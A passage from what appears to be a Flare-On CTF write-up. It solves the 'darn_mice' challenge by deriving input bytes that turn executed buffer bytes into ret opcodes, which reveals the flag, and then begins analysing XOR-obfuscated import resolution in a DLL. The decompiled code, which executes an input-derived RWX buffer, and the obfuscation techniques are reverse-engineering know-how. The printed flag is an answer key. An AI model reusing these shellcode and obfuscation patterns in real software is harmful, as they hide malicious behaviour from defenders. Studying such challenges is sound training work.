</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">extraout_DL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">extraout_DL_00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">some_array</span> <span class="p">[</span><span class="mi">36</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">stack_cookie</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">stack_cookie</span> <span class="o">=</span> <span class="n">DAT_00419178</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\x50&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x51</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x97</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x90</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xa3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_array</span><span class="p">[</span><span class="mi">35</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_On_your_plate</span><span class="p">,</span><span class="n">_you_see_four_oliv_00419034</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* input length must be 35 chrs */</span>
</span></span><span class="line"><span class="cl">    <span class="n">len</span> <span class="o">=</span> <span class="nf">_strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">input_string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">35</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_No</span><span class="p">,</span><span class="n">_nevermind</span><span class="p">.</span><span class="n">_0041905c</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar2</span> <span class="o">=</span> <span class="nf">SUB41</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar1</span> <span class="o">=</span> <span class="n">extraout_DL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_You_leave_the_room</span><span class="p">,</span><span class="n">_and_a_mouse_E_0041906c</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">((</span><span class="n">uVar2</span> <span class="o">=</span> <span class="nf">SUB41</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">36</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">some_array</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">input_string</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">));</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* allocate buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mh">0x3000</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* write byte to buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span><span class="p">)(</span><span class="n">some_array</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">+</span> <span class="n">input_string</span><span class="p">[</span><span class="n">n</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* execute buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">buffer</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">            <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_Nibble</span><span class="p">...</span><span class="n">_00419098</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_When_you_return</span><span class="p">,</span><span class="nl">_you_only</span><span class="p">:</span><span class="n">_</span><span class="o">%</span><span class="n">s_004190a4</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">input_string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">decrypt_string</span><span class="p">(</span><span class="n">ENCRYPTED_STRING</span><span class="p">,</span><span class="n">SIZE</span><span class="p">,</span><span class="n">input_string</span><span class="p">,(</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">s_salty_004190c4</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">ENCRYPTED_STRING</span><span class="p">,</span><span class="n">SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_</span><span class="o">%</span><span class="n">s_004190cc</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ENCRYPTED_STRING</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar1</span> <span class="o">=</span> <span class="n">extraout_DL_00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">check_stack_cookie</span><span class="p">(</span><span class="n">stack_cookie</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,</span><span class="n">uVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We see that the input must not be longer than 35 chrs (actually it must be 35 chrs).</p>
<pre tabindex="0"><code>C:\Users\me\Desktop&gt;darn_mice.exe aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
On your plate, you see four olives.
You leave the room, and a mouse EATS one!
</code></pre><p>doing in the same in x32dbg, we see that it crashes:</p>
<p><img src="4-crash.png" alt="crash"></p>
<p>What actually happens is that for each input character, a buffer is allocated using <code>VirtualAlloc()</code> and that char value is added to a value of an array element and written to the allocated buffer.</p>
<p>The buffer is then executed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">((</span><span class="n">uVar2</span> <span class="o">=</span> <span class="nf">SUB41</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">36</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">some_array</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">input_string</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">));</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* allocate buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mh">0x3000</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* write byte to buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span><span class="p">)(</span><span class="n">some_array</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">+</span> <span class="n">input_string</span><span class="p">[</span><span class="n">n</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* execute buffer */</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">buffer</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">            <span class="nf">print_str</span><span class="p">((</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="n">s_Nibble</span><span class="p">...</span><span class="n">_00419098</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>The goal is to end up with valid instructions so the execution doesn&rsquo;t crash and the loop can continue and finally decrypt our flag.</p>
<p>We can&rsquo;t just patch it since the decryption key is our input value.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">decrypt_string</span><span class="p">(</span><span class="n">ENCRYPTED_STRING</span><span class="p">,</span><span class="n">SIZE</span><span class="p">,</span><span class="n">input_string</span><span class="p">,(</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">s_salty_004190c4</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">ENCRYPTED_STRING</span><span class="p">,</span><span class="n">SIZE</span><span class="p">);</span>
</span></span></code></pre></div><p>The idea is to write some <code>ret</code> instructions in the buffer, so once executed, it just returns from the CALL.</p>
<p><img src="4-call.png" alt="call"></p>
<p>The opcode <code>RET</code> is 32 bits:</p>
<pre tabindex="0"><code>% rz-asm -b 32 &#34;ret&#34;
c3
</code></pre><p>so we need <code>array_value[n] + input_value[n] == 0xc3</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">dat</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x7f</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0xc3</span> <span class="o">-</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">dat</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;see three, C3 C3 C3 C3 C3 C3 C3! XD&#39;</span>
</span></span></code></pre></div><p>use it as input and get the flag:</p>
<pre tabindex="0"><code>C:\Users\me\Desktop&gt;darn_mice.exe &#34;see three, C3 C3 C3 C3 C3 C3 C3! XD&#34;
On your plate, you see four olives.
You leave the room, and a mouse EATS one!
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
Nibble...
When you return, you only: see three, C3 C3 C3 C3 C3 C3 C3! XD
i_w0uld_l1k3_to_RETurn_this_joke@flare-on.com
</code></pre><h1 id="5-t8">5. T8</h1>
<p>(maybe some day ?)</p>
<h1 id="6-a-la-mode">6. a la mode</h1>
<h2 id="61-challenge-prompt">6.1 Challenge Prompt</h2>
<p>FLARE FACT #824: Disregard flare fact #823 if you are a .NET Reverser too.
We will now reward your fantastic effort with a small binary challenge. You&rsquo;ve earned it kid!</p>
<h2 id="62-solution">6.2 Solution</h2>
<p>We get 2 files:</p>
<ul>
<li>HowDoesThisWork.dll</li>
<li>IR chat log.txt</li>
</ul>
<pre tabindex="0"><code>[FLARE Team]  Hey IR Team, it looks like this sample has some other binary that might
              interact with it, do you have any other files that might be of help.

[IR Team]     Nope, sorry this is all we got from the client, let us know what you got.
</code></pre><p>Looking at the dll in dnSpy, we can see this:</p>
<p><img src="6-dnspy.png" alt="dnSpy"></p>
<p>It&rsquo;s basically a client to client for named pipe, that will send a <strong>password</strong> and get something back.
Nothing else, and actually nothing much we can do with&hellip;</p>
<p>Let&rsquo;s change our perspective and open the same dll with ghidra.</p>
<p>Inspecting the strings, we can see a serie of weird looking strings:</p>
<p><img src="6-strings.png" alt="suspicious strings"></p>
<p>Following XREF, we end up in a function where all or most those strings are used as a parameter to the same function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_imports</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">kernel32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">func_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">_g_memset</span> <span class="o">=</span> <span class="n">wr_memset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">g_strcmp</span> <span class="o">=</span> <span class="n">wr_strcmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">g_strcpy</span> <span class="o">=</span> <span class="n">wr_strcpy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kernel32</span> <span class="o">=</span> <span class="nf">get_kernel32</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_T</span><span class="p">{</span><span class="n">xdr_vys</span><span class="p">{</span><span class="n">r_10015060</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_TxyyrtcYvzrsG</span><span class="o">~</span><span class="n">gr_10015070</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ConnectNamedPipe</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_TervcrYvzrsG</span><span class="o">~</span><span class="n">grV_10015084</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">CreateNamedPipeA</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_TervcrC_ervs_10015098</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">CreateThread</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_S</span><span class="o">~</span><span class="n">dtxyyrtcYvzrsG</span><span class="o">~</span><span class="n">gr_100150a8</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">DisconnectNamedPipe</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_Q</span><span class="p">{</span><span class="n">bd_Q</span><span class="o">~</span><span class="p">{</span><span class="n">rUbqqred_100150bc</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">FlushFileBuffers</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_Prc</span><span class="p">[</span><span class="n">vdcReexe_100150d0</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">GetLastError</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_PrcGextrdd_rvg_100150e0</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">GetProcessHeap</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_</span><span class="p">{</span><span class="n">dcetzgV_100150f0</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">lstrcmpA</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
